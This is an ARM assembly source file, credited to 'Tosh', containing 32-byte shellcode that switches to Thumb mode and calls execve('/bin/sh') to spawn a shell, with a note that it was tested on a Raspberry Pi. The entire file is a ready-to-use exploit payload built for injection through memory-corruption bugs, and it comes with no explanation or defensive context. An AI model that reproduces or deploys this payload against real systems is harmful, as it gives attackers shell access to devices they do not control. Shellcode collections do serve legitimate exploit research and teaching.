/*
	Author:	Tosh		
	
	execve("/bin/sh", ["/bin/sh"], [])
	ARM shellcode (32 bytes)
	Tested on Raspberry PI
*/

.section .text

.global _start

_start:
.code 32
	adr %r1, .thumb+1
	bx %r1
	
.code 16	
.thumb:
	adr %r0, .string
	sub %r1, %r1, %r1
	mov %r2, %r1
	push {%r0, %r1}

	mov %r1, %sp
	mov %r7, $11
	swi #1

.align	
.string:	.string "/bin/sh"
	
